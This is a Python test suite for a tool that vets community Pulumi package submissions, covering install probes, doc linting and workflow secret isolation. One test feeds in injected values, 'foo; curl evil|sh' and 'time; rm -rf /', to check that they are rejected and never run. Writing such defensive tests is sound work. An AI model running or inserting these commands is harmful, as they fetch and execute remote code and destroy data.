from __future__ import annotations

import os
import re
import sys
import tempfile
import unittest
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent))
import cli  # noqa: E402
import comment_commands  # noqa: E402
import doc_lint  # noqa: E402
import fact_sheet  # noqa: E402
import github_api  # noqa: E402
import package_list  # noqa: E402
import sdk_install_probe  # noqa: E402
import verify_entry  # noqa: E402
from models import DocFile, DocFinding, Entry, InstallResult, Manifest, Version, provider_name  # noqa: E402

SCHEMA: dict[str, Any] = {
    "name": "time",
    "pluginDownloadURL": "https://get.example.com/time",
    "language": {
        "nodejs": {"packageName": "@pulumiverse/time"},
        "python": {"packageName": "pulumiverse_time"},
        "go": {"importBasePath": "github.com/pulumiverse/pulumi-time/sdk/go/time"},
    },
}


class InstallProbeTests(unittest.TestCase):
    def setUp(self) -> None:
        self.calls: list[list[str]] = []
        self._real_run = sdk_install_probe._run

        def fake(cmd: list[str], cwd: str | None = None, env: dict[str, str] | None = None) -> tuple[bool, str]:
            self.calls.append(cmd)
            return True, ""

        sdk_install_probe._run = fake

    def tearDown(self) -> None:
        sdk_install_probe._run = self._real_run

    def test_builds_safe_commands_from_schema(self) -> None:
        commands = {r.language: r.command for r in sdk_install_probe.probe_installs("time", "v0.1.1", SCHEMA)}
        self.assertEqual(commands["plugin"], "pulumi plugin install resource time v0.1.1")
        self.assertEqual(commands["nodejs"], "npm install @pulumiverse/time@0.1.1")
        self.assertEqual(commands["python"], "pip download pulumiverse_time==0.1.1")
        self.assertIn("go get github.com/pulumiverse/pulumi-time/sdk/go/time@v0.1.1", commands["go"])
        flat = [" ".join(c) for c in self.calls]
        self.assertTrue(any("-- @pulumiverse/time@0.1.1" in c for c in flat))  # passed as argv, never a shell
        self.assertTrue(any("--server https://get.example.com/time" in c for c in flat))

    def test_rejects_injected_identifiers_without_executing(self) -> None:
        evil = {**SCHEMA, "language": {**SCHEMA["language"], "nodejs": {"packageName": "foo; curl evil|sh"}}}
        results = {r.language: r.result for r in sdk_install_probe.probe_installs("time; rm -rf /", "v0.1.1", evil)}
        self.assertEqual(results["plugin"], "rejected")
        self.assertEqual(results["nodejs"], "rejected")
        self.assertFalse(any(c and c[0] in ("npm", "pulumi") for c in self.calls))

    def test_github_scheme_plugin_url_is_passed_as_server(self) -> None:
        schema = {**SCHEMA, "pluginDownloadURL": "github://api.github.com/o/r"}
        list(sdk_install_probe.probe_installs("time", "v0.1.1", schema))
        flat = [" ".join(c) for c in self.calls]
        self.assertTrue(any("--server github://api.github.com/o/r" in c for c in flat))

    def test_python_uses_pulumi_underscore_when_advertised_without_name(self) -> None:
        results = sdk_install_probe.probe_installs("thoth", "v1.0.0", {"name": "thoth", "language": {"python": {}}})
        self.assertEqual(next(r for r in results if r.language == "python").command, "pip download pulumi_thoth==1.0.0")

    def test_unadvertised_sdks_are_not_probed(self) -> None:
        results = sdk_install_probe.probe_installs("thoth", "v1.0.0", {"name": "thoth", "language": {}})
        self.assertEqual({r.language for r in results}, {"plugin"})


class PythonResolveTests(unittest.TestCase):
    def setUp(self) -> None:
        self._run, self._exists = sdk_install_probe._run, sdk_install_probe._pypi_version_exists

        def failing_run(cmd: list[str], cwd: str | None = None, env: dict[str, str] | None = None) -> tuple[bool, str]:
            return False, "ERROR: No matching distribution"

        sdk_install_probe._run = failing_run

    def tearDown(self) -> None:
        sdk_install_probe._run = self._run
        sdk_install_probe._pypi_version_exists = self._exists

    def test_sdist_only_resolves_via_metadata(self) -> None:
        def exists(package: str, version: str) -> bool:
            return True

        sdk_install_probe._pypi_version_exists = exists
        self.assertEqual(sdk_install_probe._python_resolves("pkg", "1.0.0"), (True, ""))

    def test_missing_package_still_fails(self) -> None:
        def missing(package: str, version: str) -> bool:
            return False

        sdk_install_probe._pypi_version_exists = missing
        ok, err = sdk_install_probe._python_resolves("pkg", "1.0.0")
        self.assertFalse(ok)
        self.assertIn("No matching distribution", err)


class CliNoticeTests(unittest.TestCase):
    def test_rejection_sheet_lists_offending_files(self) -> None:
        out = cli._rejection_sheet(["themes/x.md", "sdk/y.go"])
        self.assertIn("❌", out)
        self.assertIn("Not ready", out)
        self.assertIn("themes/x.md", out)

    def test_nothing_to_check_sheet(self) -> None:
        self.assertIn("Nothing to check", cli._nothing_to_check_sheet())

    def test_package_list_and_publisher_allowlist_are_permitted(self) -> None:
        changed = ["community-packages/package-list.json",
                   "tools/resourcedocsgen/pkg/publishers/publisher-names.json"]
        self.assertEqual(cli._files_outside_allowlist(changed), [])

    def test_generated_files_are_offending(self) -> None:
        changed = ["community-packages/package-list.json",
                   "themes/default/content/registry/packages/thoth/_index.md",
                   "themes/default/data/registry/packages/thoth.yaml"]
        self.assertEqual(cli._files_outside_allowlist(changed),
                         ["themes/default/content/registry/packages/thoth/_index.md",
                          "themes/default/data/registry/packages/thoth.yaml"])


class DocLintTests(unittest.TestCase):
    def test_flags_broken_refs_and_ignores_absolute(self) -> None:
        issues = doc_lint.find_issues(
            "![logo](./logo.png)\n<a href=\"./page\">y</a>\nsee [config](./x.md)\n"
            "[ok](https://e.com)\n![ok](https://e.com/y.png)\n")
        self.assertEqual({i.line for i in issues}, {1, 2, 3})
        self.assertEqual({i.kind for i in issues}, {"relative-image", "raw-relative-link", "md-suffixed-link"})

    def test_clean_doc(self) -> None:
        self.assertEqual(doc_lint.find_issues("[x](https://y)\n![a](https://y/z.png)\n"), [])

    def test_uppercase_scheme_is_absolute(self) -> None:
        self.assertEqual(doc_lint.find_issues('<img src="HTTPS://e.com/a.png">\n'), [])


class PackageListTests(unittest.TestCase):
    def test_added_entries(self) -> None:
        base = '{"include":[{"repoSlug":"a/b","schemaFile":"s"}]}'
        grown = '{"include":[{"repoSlug":"a/b","schemaFile":"s"},{"repoSlug":"c/d","schemaFile":"t"}]}'
        self.assertEqual(package_list.added_entries(base, base), [])
        self.assertEqual([e.repoSlug for e in package_list.added_entries(base, grown)], ["c/d"])
        self.assertEqual([e.repoSlug for e in package_list.added_entries("[]", '[{"repoSlug":"c/d","schemaFile":"t"}]')],
                         ["c/d"])


class VerifyTests(unittest.TestCase):
    def test_provider_name_prefers_schema_then_repo_suffix(self) -> None:
        self.assertEqual(provider_name("x/pulumi-thoth", {"name": "thoth"}), "thoth")
        self.assertEqual(provider_name("x/pulumi-thoth", {}), "thoth")
        self.assertEqual(provider_name("x/pulumi-provider-dex", {}), "provider-dex")

    def test_unverifiable_entry_is_red_with_reason(self) -> None:
        manifest = verify_entry._unverifiable(Entry("x/pulumi-demo", "s.json"), "no release")
        self.assertFalse(manifest.green)
        self.assertEqual(manifest.error, "no release")
        self.assertEqual(manifest.providerName, "demo")


class ReportTargetTests(unittest.TestCase):
    def test_prefers_recorded_pr_number(self) -> None:
        with tempfile.TemporaryDirectory() as scratch:
            cwd = os.getcwd()
            os.chdir(scratch)
            try:
                Path("pr-number.txt").write_text("42\n")
                self.assertEqual(comment_commands._target_pr(), 42)
            finally:
                os.chdir(cwd)

    def test_falls_back_to_owner_and_ref(self) -> None:
        pulls: list[dict[str, Any]] = [
            {"number": 1, "head": {"ref": "patch-1", "repo": {"owner": {"login": "alice"}}}},
            {"number": 2, "head": {"ref": "patch-1", "repo": {"owner": {"login": "bob"}}}}]
        real = github_api.open_pull_requests

        def fake() -> list[dict[str, Any]]:
            return pulls

        github_api.open_pull_requests = fake
        os.environ.update(PR_HEAD="patch-1", PR_HEAD_OWNER="bob")
        try:
            self.assertEqual(comment_commands._target_pr(), 2)
        finally:
            github_api.open_pull_requests = real
            del os.environ["PR_HEAD"], os.environ["PR_HEAD_OWNER"]


def _manifest(green: bool = True, warnings: bool = False, findings: list[DocFinding] | None = None,
              installs: list[InstallResult] | None = None, docs: list[DocFile] | None = None) -> Manifest:
    return Manifest("x/pulumi-demo", "s.json", "demo", Version("v1.0.0", "0" * 40), "x",
                    installs or [], findings or [], green=green, warnings=warnings, docs=docs or [])


class FactSheetTests(unittest.TestCase):
    def test_green_render_with_docs_and_findings(self) -> None:
        out = fact_sheet.render(_manifest(
            findings=[DocFinding(12, "relative-image", "![a](./b.png)")],
            docs=[DocFile("docs/_index.md", 3, "# Title\n```go\nx\n```\n")]))
        self.assertIn("✅", out.splitlines()[0])
        self.assertIn("Doc-lint: 1 finding(s)", out)
        self.assertIn("docs/_index.md:12", out)
        self.assertIn("/blob/" + "0" * 40 + "/docs/_index.md", out)
        self.assertIn("# Title", out)

    def test_red_render_with_install_failure(self) -> None:
        out = fact_sheet.render(_manifest(
            green=False,
            installs=[InstallResult("python", "pip download x==1", "fail", error="No matching distribution")]))
        self.assertIn("❌", out.splitlines()[0])
        self.assertIn("Not ready", out)
        self.assertIn("/check", out)
        self.assertIn("pip download x==1", out)
        self.assertIn("No matching distribution", out)
        self.assertIn("<details>", out)

    def test_doc_fence_outgrows_backticks(self) -> None:
        self.assertEqual(fact_sheet._fence_longer_than_any_run_in("no ticks"), "```")
        self.assertEqual(fact_sheet._fence_longer_than_any_run_in("```go\nx\n```"), "````")

    def test_warning_render_is_yellow(self) -> None:
        out = fact_sheet.render(_manifest(
            green=True, warnings=True,
            installs=[InstallResult("nodejs", "npm install x@1", "fail", error="404")]))
        self.assertIn("🟡", out.splitlines()[0])
        self.assertIn("review the warnings", out.lower())
        self.assertNotIn("Ready for approval", out)

    def test_error_render_is_compact_and_red(self) -> None:
        manifest = _manifest(green=False)
        manifest.error = "No published GitHub release."
        out = fact_sheet.render(manifest)
        self.assertIn("❌", out.splitlines()[0])
        self.assertIn("Not ready", out)
        self.assertIn("No published GitHub release.", out)
        self.assertNotIn("docs generate", out)


_SECRET = re.compile(r"secrets\.|ESC_ACTION|esc-action|ANTHROPIC_API_KEY|PULUMI_BOT_TOKEN|id-token: *write")
_RUNS_CODE = re.compile(
    r"cli\.py check(?![-\w])|npm (install|ci)|pip (install|download)|go get|go mod download|pulumi plugin install")


class SecretCodeSeparationTests(unittest.TestCase):
    """No community-package workflow may both hold a secret and run a contributor's code, or a
    malicious package could read the secret."""

    def test_no_workflow_mixes_secrets_with_contributor_code(self) -> None:
        workflows = sorted((Path(__file__).resolve().parents[3] / ".github/workflows").glob("community-package-*.yml"))
        self.assertTrue(workflows, "no community-package workflows found")
        for workflow in workflows:
            text, name = workflow.read_text(), workflow.name
            holds_secret = bool(_SECRET.search(text))
            self.assertFalse(holds_secret and _RUNS_CODE.search(text), f"{name}: secret shares a job with code")
            self.assertNotIn("pull_request_target", text, name)
            if holds_secret:
                self.assertNotRegex(text, r"ref:.*\.head\.", f"{name}: secret job checks out the PR head")


if __name__ == "__main__":
    unittest.main()
